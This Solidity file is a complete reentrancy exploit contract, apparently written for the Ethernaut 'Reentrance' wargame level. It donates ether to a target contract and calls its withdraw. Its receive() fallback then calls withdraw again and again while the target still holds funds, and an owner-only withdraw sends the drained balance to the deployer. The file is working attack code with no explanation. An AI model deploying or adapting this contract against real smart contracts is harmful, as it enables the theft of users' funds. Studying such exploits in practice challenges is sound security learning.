// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ReentranceExploit {
  Reentrance public target;
  address selfAddress = address(this);
  address public owner;

  constructor(address payable _target) public {
      target = Reentrance(_target);
      owner = msg.sender;
  }

  function getBalance() public view returns (uint balance) {
      return selfAddress.balance;
  }

  function getBalanceTarget() public view returns (uint balance) {
      return address(target).balance;
  }

  function attack() public payable {
    target.donate{value: msg.value}(selfAddress);
    target.withdraw(msg.value);
  }

  function withdraw() public returns(bool) {
    require (msg.sender == owner);
    (bool success, ) = msg.sender.call{value: selfAddress.balance}("");
    require(success, "Failed to send Ether");
    return success;
  }

  receive() external payable {
    if (address(target).balance >= msg.value) {
      target.withdraw(msg.value);
    }
  }

}